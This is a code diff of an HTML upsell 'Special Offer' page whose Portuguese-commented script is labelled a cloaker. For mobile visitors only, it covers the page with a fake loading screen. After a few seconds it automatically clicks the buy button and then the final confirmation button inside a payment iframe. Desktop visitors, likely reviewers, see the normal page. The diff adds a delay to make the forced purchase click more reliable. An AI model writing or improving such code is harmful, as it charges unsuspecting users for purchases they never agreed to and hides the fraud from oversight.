@@ -10,7 +10,7 @@
                 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTE8 - Special Offer</title>
+  <title>TESTE9 - Special Offer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -146,25 +146,16 @@
 	  // Aguarda o conteúdo da página ser completamente carregado para iniciar o processo.
 	  document.addEventListener('DOMContentLoaded', () => {
 
-	  // ===================================================================
-	  // PARTE 1: CLOAKER (VERIFICADOR DE DISPOSITIVO)
-	  // ===================================================================
+	  // PARTE 1: CLOAKER
 	  const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
-	  // Se não for um dispositivo móvel, o script para aqui.
 	  if (!isMobile) {
 		console.log('Usuário de Desktop detectado. A página de upsell será exibida normalmente.');
 		return; 
 	  }
-
-	  // Se for um dispositivo móvel, o script continua.
 	  console.log('Usuário de Celular/Tablet detectado. Ativando compra automática com tela de carregamento.');
 	  
-	  // ===================================================================
-	  // PARTE 2: TELA DE CARREGAMENTO (LOADING)
-	  // ===================================================================
+	  // PARTE 2: TELA DE CARREGAMENTO
 	  function showLoadingScreen() {
-		// CSS seguro que centraliza o conteúdo e não conflita com a compra.
 		const loadingCSS = `
 		  <style id="loading-style">
 			.loader-container {
@@ -193,8 +184,6 @@
 			}
 		  </style>
 		`;
-
-		// Estrutura HTML segura que não gera conflitos.
 		const loadingHTML = `
 		  <div id="custom-loader" class="loader-container">
 			<div class="loader-content-wrapper">
@@ -206,19 +195,12 @@
 			</div>
 		  </div>
 		`;
-
 		document.head.insertAdjacentHTML('beforeend', loadingCSS);
 		document.body.insertAdjacentHTML('beforeend', loadingHTML);
-		
-		// O TRECHO DE CÓDIGO QUE OCULTAVA O CONTEÚDO FOI REMOVIDO DAQUI PARA EVITAR CONFLITOS.
 	  }
-
-	  // Exibe a tela de carregamento imediatamente.
 	  showLoadingScreen();
 
-	  // ===================================================================
-	  // PARTE 3: COMPRA AUTOMÁTICA (LÓGICA FUNCIONAL ORIGINAL)
-	  // ===================================================================
+	  // PARTE 3: COMPRA AUTOMÁTICA
 	  const tempoDeEsperaEmSegundos = 8;
 	  const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
 	  const seletorIframePopUp = 'iframe.cp-exocu-frame';
@@ -256,10 +238,18 @@
 			  const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
 			  const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
 			  if (botaoConfirmacao) {
-				console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Realizando o clique!');
-				botaoConfirmacao.click();
-				clearInterval(intervalo);
-				console.log('Ação de clique para finalizar a compra foi executada com sucesso!');
+				console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Aguardando 100ms antes do clique para garantir a inicialização completa do script.');
+				
+				// ============== A CORREÇÃO ESTÁ AQUI ==============
+				// Adicionamos um pequeno delay para garantir que o script da CartPanda
+				// tenha tempo de anexar todos os seus eventos ao formulário.
+				setTimeout(() => {
+					console.log('Realizando o clique final!');
+					botaoConfirmacao.click();
+					console.log('Ação de clique para finalizar a compra foi executada com sucesso!');
+				}, 300); // Atraso de 300 milissegundos
+
+				clearInterval(intervalo); // Limpa o monitoramento pois o botão já foi encontrado.
 			  }
 			} catch (e) {
 			  clearInterval(intervalo);
